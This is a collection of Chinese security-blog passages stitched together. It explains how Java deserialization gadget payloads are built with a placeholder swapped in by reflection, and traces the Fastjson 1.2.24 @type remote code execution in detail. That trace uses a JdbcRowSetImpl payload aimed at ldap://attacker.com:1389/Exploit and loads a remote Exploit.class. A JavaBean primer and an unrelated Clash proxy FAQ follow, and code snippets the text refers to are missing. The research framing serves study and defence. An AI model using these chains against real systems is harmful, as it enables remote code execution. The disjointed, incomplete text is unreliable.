Java 反序列化构造里的“移花接木”：为什么非要先占位、再反射替换？

在翻看 ysoserial 或者分析 ROME、Commons Collections 等反序列化利用链时，几乎所有人都会遇到一段让人抓狂的“迷惑代码”：

致命的导火索：HashMap.put() 会自己“动手”

Java 反序列化构造中，HashMap 是最常用的入口包装器（Kick-off gadget）。但很多人忽略了一点：HashMap 在添加元素的那一刻，就会主动去摸 Key 的底。

在 ROME 链中，这瞬间拉开了一整串连锁反应：

ToStringBean.toString() 会自动抓取被包装对象的所有 Getter 方法并逐一执行。如果被包装的 _obj 已经是恶意的 TemplatesImpl，那么当遍历到 getOutputProperties() 时，本地就会立刻调用 newTransformer()。

你在写生成 Payload 的脚本，结果一按运行，自己本地的计算器先弹出来了。

提前在本地触发，会有多惨？

有人可能会说：“本地弹个计算器就弹了呗，只要 Payload 能生成出来不就行了？”

很遗憾，提前触发带来的远不止本地执行这么简单，它会直接导致 Payload 报废，主要卡在两个硬伤上：

1. 半成品直接暴毙（NPE）

构造一个可利用的 TemplatesImpl，通常需要用反射强行注入一堆私有字段：_name、_bytecodes、_tfactory 等。

如果还没完全装配完毕，或者上下文环境稍有缺漏，提前执行 Getter 往往不会成功，而是直接抛出 NullPointerException 或内部初始化异常，当前 JVM 进程当场崩溃退出，你连序列化文件的影子都见不到。

2. 状态被“污染”：最隐蔽的 NotSerializableException

这是最致命的问题——对象的缓存效应与脏状态。

观察 TemplatesImpl 的内部属性：

正常情况下，序列化前的 _class 必须是 null。序列化流中只需要保存纯净的字节码数组（_bytecodes）。

一旦在本地 put() 阶段提前触发了实例化，内部的 defineTransletClasses() 会被执行，恶意的字节码被加载成了真正的 Class 对象，并直接写回了 _class 数组做性能缓存。

坏事就坏在这里：
这个动态生成的 Class 对象以及它关联的本地 ClassLoader 是不可被原生序列化的。接下来当你满心欢喜调用 oos.writeObject(hashMap) 时，Java 序列化机制会直接抛出：

原本该送去目标靶机的 Payload，死在了序列化的前夜。

“移花接木”：给 HashMap 一张良民证

既然病根在 hashMap.put() 会查验户口，解决思路就非常清晰了：进门时给它看良民证，安全进门后再把刺客换进去。

这就是“先占位、后反射替换”的精髓：

  1. 安全占位：初始时塞一个毫无杀伤力、也不搞事情的普通对象（比如一个单纯的字符串，或 ConstantTransformer(1)）。put() 阶段它被随便调用，哈希表平稳地把桶位分配好。
  2. 静默掉包：等 HashMap 归于平静，直接利用 Java 反射的底层权限 field.setAccessible(true)，越过所有 Setter、构造方法和生命周期回调，直接在内存堆上修改指针，把私有属性 _obj 替换为真正的 TemplatesImpl。
  3. 完美冻结：此时的 TemplatesImpl 内部的所有状态字段（如 _class）都处于纯洁未触发的初始状态，序列化顺畅无阻。

直到这个序列化对象被发往靶机，在远端目标反序列化执行 readObject() 重新计算 Hash 时，这颗延迟引信才会被真正引爆。

思考与延伸

这种写法不仅出现在 ROME 链中，在 Commons Collections、Spring、AspectJWeaver 等各种复杂的 Gadget 构造中比比皆是。

  • 凡是遇到 HashMap、Hashtable、PriorityQueue 这种在添加元素时具有“主动感知与比对机制”（调用 hashCode()、equals()、compareTo()）的集合；
  • 凡是遇到被调用的终点对象在执行时会修改自身内部状态、产生缓存污染。

“先放占位符骗过检查，再用反射静默替换” 都是标准的最优解。它利用反射的“无感知侵入”能力，巧妙地化解了本地装配与远端触发之间的时序死锁。

Fastjson 1.2.24 调用全过程（语言描述版）

发表于 2026-09-21 更新于 2026-09-23 分类于 安全研究 ， Java安全

【Fastjson 反序列化专题】系列文章

  1. Fastjson 反序列化漏洞基础
  2. 本文：Fastjson 1.2.24 调用全过程（语言描述版）
  3. Fastjson 1.2.24 Payload → RCE 完整调用链（源码深度版）

Payload

当攻击者构造好上面这段恶意 JSON 字符串，传入 JSON.parse(payload) 后，整个过程如下：

一、入口：JSON.parse()

程序调用 JSON.parse(payload)。这个方法内部做了三件事：第一，创建一个 DefaultJSONParser 解析器实例；第二，调用这个解析器的 parse() 方法执行实际解析；第三，解析完成后处理引用关系并关闭解析器。

创建 DefaultJSONParser 时，它需要三个参数：payload 字符串本身、全局 ParserConfig（里面存着所有配置信息和反序列化器缓存），以及一组默认的 Feature 标志位。

二、构造解析器：创建 JSONScanner

DefaultJSONParser 的构造函数内部，首先用 payload 字符串创建了一个 JSONScanner（词法分析器）。这个词法分析器负责逐字符地扫描 JSON 内容。

创建完词法分析器后，构造函数会预读第一个字符。它发现 payload 的第一个字符是 {，于是调用 lexer.next() 把指针移到 { 之后的下一个字符，然后把当前 token 设为 LBRACE（左花括号），表示”我看到了一个 JSON 对象的开始”。

此时的状态：lexer 的当前 token 是 LBRACE，指针停留在 { 后面那个双引号 " 的位置。

三、分发解析：parse() → parseObject()

parser.parse() 被调用后，它内部调用 parse(null)。这个方法看到当前 token 是 LBRACE，于是知道要解析的是一个 JSON 对象。它做了两件事：第一，创建一个空的 JSONObject（本质是一个 HashMap）；第二，调用 parseObject(object, fieldName) 进入真正的对象解析逻辑。

四、对象解析主循环：parseObject()

parseObject() 是整个解析过程的核心。它进入一个无限 for 循环，每一轮循环处理 JSON 对象中的一个键值对。

第一轮循环：读到 “@type”

循环开始时，先跳过空白字符，然后读取当前字符。当前字符是双引号 "，说明 key 是一个带引号的字符串。于是调用 lexer.scanSymbol(symbolTable, '"') 扫描这个字符串。扫描的结果是 "@type"。

读到 key 之后，跳过冒号 : 和空白字符，准备读取 value。

然后进入一个关键判断：if (key == JSON.DEFAULT_TYPE_KEY)——也就是检查这个 key 是不是 "@type"。因为 scanSymbol 使用了 SymbolTable 做字符串内化（intern），返回的 "@type" 字符串与 JSON.DEFAULT_TYPE_KEY 是同一个引用，所以 == 比较结果为 true。命中了！

五、@type 处理：加载类（漏洞根因）

命中 @type 后，解析器继续调用 lexer.scanSymbol(symbolTable, '"') 读取 @type 的值，得到字符串 "com.sun.rowset.JdbcRowSetImpl"。

接下来就是整个漏洞的根因：解析器直接调用 TypeUtils.loadClass(typeName, config.getDefaultClassLoader())，把这个字符串转换成 Class 对象。这里没有任何安全检查，没有黑名单过滤，没有白名单校验，没有 autoType 开关——攻击者给什么类名，就加载什么类。

六、TypeUtils.loadClass()：字符串 → Class 对象

TypeUtils.loadClass() 接收类名字符串和一个 ClassLoader。它按以下顺序尝试加载：

首先查内部缓存 mappings，看这个类名是否之前已经加载过。这是第一次，缓存里没有。

然后检查类名是否以 [ 开头（数组类型）或以 L 开头且 ; 结尾（JVM 类描述符格式）。"com.sun.rowset.JdbcRowSetImpl" 不属于这两种情况，跳过。

接着尝试用传入的 ClassLoader 加载。如果传入的是 null，就用线程上下文 ClassLoader。调用 contextClassLoader.loadClass("com.sun.rowset.JdbcRowSetImpl")，JVM 在 rt.jar 中找到了这个类（它是 JDK 自带的），加载成功，返回 JdbcRowSetImpl.class。

加载成功后，还会调用 mappings.put(className, clazz) 把这个类存入缓存。这个缓存操作在 1.2.47 绕过中会被利用，但现在暂时不重要。

最终返回 JdbcRowSetImpl.class 这个 Class 对象。

七、获取反序列化器：config.getDeserializer()

拿到 Class 对象后，解析器先设置 resolveStatus = TypeNameRedirect（一个状态标记，告诉后续代码”@type 已经被处理过了”），然后调用 config.getDeserializer(clazz) 获取这个类对应的反序列化器。

getDeserializer() 方法首先查缓存，看 JdbcRowSetImpl 是否已经有预注册的反序列化器。没有，因为它不是 Fastjson 内置支持的类型。

然后进行 denyList（黑名单）检查。1.2.24 版本的 denyList 数组只有一个元素："java.lang.Thread"。方法检查 "com.sun.rowset.JdbcRowSetImpl" 是否以 "java.lang.Thread" 开头——显然不是，所以未拦截，直接通过。

接下来检查这个类是不是 Enum、数组、Collection、Map、Throwable 等特殊类型。JdbcRowSetImpl 都不是，最终走到最后一个分支：调用 createJavaBeanDeserializer(clazz, type) 为这个类创建一个通用的 JavaBean 反序列化器。

八、创建 JavaBeanDeserializer：反射分析类结构

createJavaBeanDeserializer() 内部首先调用 JavaBeanInfo.build(clazz, type, propertyNamingStrategy)。这个方法通过 Java 反射机制彻底分析 JdbcRowSetImpl 类的结构：找到它的默认构造函数 JdbcRowSetImpl()，找到它所有的 public setter 方法（setDataSourceName、setAutoCommit、setCommand等等），以及每个 setter 对应的参数类型。

分析完成后，为 JdbcRowSetImpl 创建一个 JavaBeanDeserializer 实例。这个实例的构造函数中，会为类的每一个 setter 创建一个对应的 FieldDeserializer，每个 FieldDeserializer 内部持有对应 setter 的 Method 对象（比如 setDataSourceName 对应的 Method 对象）。这些 FieldDeserializer 按字段名排序后存入 sortedFieldDeserializers 数组，方便后续快速查找。

创建完成后，这个反序列化器会被缓存起来，下次遇到同一个类就不用再反射分析了。

九、进入 JavaBeanDeserializer.deserialze()

拿到 JavaBeanDeserializer 后，parseObject() 调用它的 deserialze(parser, clazz, fieldName) 方法，把解析工作交给它。

deserialze() 经过两层转发（deserialze(parser, type, fieldName) → deserialze(parser, type, fieldName, 0) → deserialze(parser, type, fieldName, null, 0)），进入真正的主方法。

主方法首先检查 resolveStatus，发现它是 TypeNameRedirect（值为 2），说明 @type 已经在上层被处理过了，于是把状态重置为 NONE（值为 0）。

然后检查当前 token 类型。此时 lexer 的 token 是 COMMA（逗号），因为上一层 parseObject() 在读完 @type 的值后已经读到了逗号。这个 token 满足进入主循环的条件。

十、主循环：逐字段解析并调用 setter

主循环是一个 for (int fieldIndex = 0;; fieldIndex++) 无限循环，每一轮处理 JSON 中的一个字段。

处理 “dataSourceName”

循环开始时，根据 fieldIndex 从 sortedFieldDeserializers 数组中取出对应位置的 FieldDeserializer，获取它关联的字段信息（字段名、字段类型等）。

然后进入”快速匹配”逻辑。这是 Fastjson 的高性能设计：它不是先完整读取 JSON 的 key，再去查找对应的字段——而是直接拿当前字段的 name_chars（字段名的字符数组），让 lexer 同时做两件事：检查 JSON 当前位置的 key 是否与 name_chars 匹配，如果匹配则直接读取对应类型的值。

对于 dataSourceName，字段类型是 String，于是调用 lexer.scanFieldString(name_chars)。如果当前 JSON 位置的 key 恰好是 "dataSourceName"，lexer 会一次性完成匹配和值读取：matchStat > 0 表示匹配成功，fieldValue 得到 "ldap://attacker.com:1389/Exploit"。

如果排序后的第一个字段不是 dataSourceName（比如 autoCommit 因为字母序在前），那么 scanFieldString 会返回 NOT_MATCH_NAME，循环 continue 到 fieldIndex = 1，用下一个字段重试，直到匹配成功。

匹配成功后，检查 object 是否为 null。因为这是第一个字段，对象还没创建，所以此时调用 createInstance(parser, type) 来创建对象。

十一、createInstance()：反射创建 JdbcRowSetImpl 实例

createInstance() 方法检查 JdbcRowSetImpl 不是接口，有默认构造函数，构造函数参数个数为 0。于是调用 constructor.newInstance()——本质就是 new JdbcRowSetImpl()。

此时一个全新的 JdbcRowSetImpl 对象被创建出来了。它的内部状态：dataSource = null，conn = null，所有属性都是初始值。这个对象本身的创建不会产生任何副作用。

十二、第一次 setValue()：设置 dataSourceName

回到主循环，对象创建好了，值也在快速路径中读取好了。于是调用 fieldDeser.setValue(object, fieldValue) 来设置字段值。

setValue() 方法内部，取出这个字段对应的 setter Method 对象——即 JdbcRowSetImpl.setDataSourceName(String) 方法的反射引用。然后调用 method.invoke(object, value)，这等价于执行了 object.setDataSourceName("ldap://attacker.com:1389/Exploit")。

setDataSourceName() 方法内部只是简单地把传入的字符串保存到 dataSource 属性中。到这里为止，没有任何危险操作发生——只是在对象里存了一个 URL 字符串。

设值完成后，检查 lexer.matchStat 是否等于 END（表示遇到了 }）。这里还没有到结尾，JSON 后面还有逗号和 autoCommit 字段，所以循环继续。

十三、第二次快速匹配：autoCommit

循环 fieldIndex++，取出下一个 FieldDeserializer。这次对应的字段是 autoCommit，类型是 boolean。

调用 lexer.scanFieldBoolean(name_chars)。lexer 检查 JSON 当前位置的 key 是否是 "autoCommit"——匹配成功！然后读取值 true。matchField = true，valueParsed = true，fieldValue = true。

十四、第二次 setValue()：setAutoCommit(true) — 触发漏洞！

调用 fieldDeser.setValue(object, true)。setValue() 内部取出 setter Method 对象——JdbcRowSetImpl.setAutoCommit(boolean)，然后调用 method.invoke(object, true)，等价于 object.setAutoCommit(true)。

这一步触发了整个漏洞链！

JdbcRowSetImpl.setAutoCommit(true) 内部检查 this.conn 是否为 null。因为对象刚创建，conn 确实是 null。于是它调用 this.connect() 来建立数据库连接。

十五、connect()：发起 JNDI 查询

connect() 方法内部，发现 this.getDataSourceName() 返回的不是 null——它返回的是前面通过 setDataSourceName() 设置的 "ldap://attacker.com:1389/Exploit"。

于是它创建了一个 InitialContext 对象（JNDI 初始上下文），然后调用 var1.lookup(this.getDataSourceName())，也就是 InitialContext.lookup("ldap://attacker.com:1389/Exploit")。

十六、InitialContext.lookup()：协议分发

InitialContext.lookup() 内部调用 getURLOrDefaultInitCtx(name)，该方法解析传入 URL 的协议头。它发现协议是 "ldap"，于是通过 NamingManager.getURLContext("ldap", ...) 获取一个 ldapURLContext（LDAP URL 上下文处理器），然后将 lookup 请求转发给它。

十七、LDAP 连接：连接攻击者服务器

ldapURLContext.lookup() 解析 URL 中的主机名（attacker.com）、端口（1389）和查询名称（Exploit）。然后向攻击者控制的 LDAP 服务器（attacker.com:1389）发起网络连接。

攻击者的 LDAP 服务器收到请求后，返回一个精心构造的 LDAP 响应。这个响应的关键内容是一个 javax.naming.Reference 对象，其中包含：

  • className："Exploit"（工厂类名）
  • factoryClassLocation："http://attacker.com:8080/"（远程代码库地址）

十八、Reference 处理：NamingManager.getObjectInstance()

LDAP 客户端收到响应后，解析出 Reference 对象，调用 NamingManager.getObjectInstance() 来实例化引用指向的对象。

这个方法内部调用 getObjectFactoryFromReference()，尝试加载 Reference 中指定的工厂类 "Exploit"。

十九、远程类加载：从攻击者服务器下载恶意类

getObjectFactoryFromReference() 首先尝试在本地 ClassPath 中加载 "Exploit" 类。显然，本地不存在这个类，抛出 ClassNotFoundException。

本地加载失败后，方法读取 Reference 中的 factoryClassLocation——"http://attacker.com:8080/"。它使用 URLClassLoader 向这个地址发起 HTTP GET 请求，下载 http://attacker.com:8080/Exploit.class。

攻击者的 HTTP 服务器返回了一个恶意的 .class 文件。URLClassLoader 将下载的字节码通过 defineClass() 加载到 JVM 中，得到 Exploit.class。

二十、实例化恶意类：RCE

加载完成后，调用 clas.newInstance() 实例化这个 Exploit 类。

攻击者编写的 Exploit 类在静态代码块 static {} 或构造函数中包含恶意代码，比如 Runtime.getRuntime().exec("calc")。实例化的瞬间，这段代码被执行——计算器弹出，RCE 达成。

二十一、返回

恶意代码执行完毕后，调用栈逐层返回。connect() 返回（可能抛异常），setAutoCommit() 返回，setValue() 返回，主循环检测到 JSON 结尾的 }，退出循环，deserialze() 返回 JdbcRowSetImpl 对象，最终 JSON.parse() 返回结果。但此时 RCE 已经完成，返回值已无关紧要。

为什么这个漏洞能成功？五个条件缺一不可

第一，Fastjson 支持 @type 功能，允许 JSON 中指定反序列化的目标类。这是攻击面的根源。

第二，1.2.24 版本在处理 @type 时，直接调用 TypeUtils.loadClass() 加载类，中间没有任何安全检查。攻击者可以指定任意类名。

第三，1.2.24 版本的 denyList 黑名单只有 "java.lang.Thread" 一个元素，com.sun.rowset.JdbcRowSetImpl 不在其中，所以在 getDeserializer() 中也没有被拦截。

第四，JdbcRowSetImpl 的 setAutoCommit() 方法在 conn 为 null 时会自动调用 connect()，而 connect() 会使用之前通过 setDataSourceName() 设置的 URL 发起 JNDI 查询。这种”setter 中有副作用”的设计是这个 Gadget 可被利用的本质原因。

第五，JNDI 在高版本 JDK 之前（JDK 8u121 以下），默认允许通过 LDAP/RMI 响应中的 Reference 远程加载类。攻击者控制 LDAP 服务器的响应内容，就能让受害者的 JVM 加载并执行任意远程代码。

概述

Fastjson是阿里巴巴的开源JSON解析库，它可以解析 JSON 格式的字符串，支持将 Java Object 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 Java Object。

FastJson提供了两个主要接口来实现对于Java Object的序列化和反序列化操作。

  • JSON.toJSONString
  • JSON.parseObject/JSON.parse

简单使用

对于Fastjson来讲，并不是所有的Java对象都能被转为JSON，只有Java Bean格式的对象才能Fastjson被转为JSON。

什么是java bean

一个合法的 JavaBean 必须严格遵循以下三条规则：

  • 提供公共无参构造函数：类必须包含一个 public 修饰的无参构造方法（如果不写任何构造方法，编译器会默认生成）。框架（如 Spring、Jackson、Fastjson）需要通过反射直接调用 Class.newInstance() 或 Constructor.newInstance() 动态创建该对象。
  • 属性私有并通过 Getter/Setter 暴露：
    • 类的成员变量必须使用 private 修饰，实现数据封装。
    • 每个私有属性都需要提供符合驼峰命名规范的公有读写方法：
      • 读方法：public Type getPropertyName()（若属性为 boolean 类型，通常是 isPropertyName()）。
      • 写方法：public void setPropertyName(Type value)。
  • 实现序列化接口（可选但标准规范强烈建议）：实现 java.io.Serializable 接口，以便对象能在网络中传输、保存到磁盘或在分布式会话（Session）间共享。

适用场景：在 Linux VPS 上通过 Clash 代理加速访问 GitHub、Google 等外网资源。

📌 背景与原理

国内 VPS 直连 GitHub 等海外服务通常速度极慢甚至超时。通过部署 Clash 代理客户端，将 VPS 的 git、curl、wget 等 TCP 流量通过代理节点转发，可显著提升下载速度。

❓ 常见问题排查

Q1：ping youtube.com 不通，但 curl 能通？

A：正常现象。ping 使用 ICMP 协议，Clash 默认仅代理 TCP/UDP，不处理 ICMP。只要 curl 返回 200，代理即生效。

Q2：curl 不加 -x 参数也能通？

A：因为安装脚本已将代理写入 /etc/profile.d/clash.sh，当前 SSH 会话自动加载了 http_proxy 环境变量。但该方式依赖 Shell 环境，使用 sudo 或后台任务时会失效，因此仍建议配置 git config --global 作为兜底。

Q3：切换节点后感觉速度没变化？

A：可运行 clashctl select 手动选择延迟较低的节点，或通过 Web 控制台 http://127.0.0.1:9090/ui 查看节点实时延迟。

Q4：sudo git clone 还是慢？

A：sudo 默认重置环境变量，不会继承 http_proxy。解决方案：已配置 git config --global 的情况下，sudo 也会读取该配置，因此不受影响。

🔒 安全提示

  • 订阅地址等同于你的代理凭证，勿公开分享。
  • Web 控制台默认监听 127.0.0.1:9090，如需外网访问，请设置 CLASH_SECRET 强密码并配置防火墙。
  • 开启 TUN 模式可能影响 SSH 连接，非必要不建议开启。
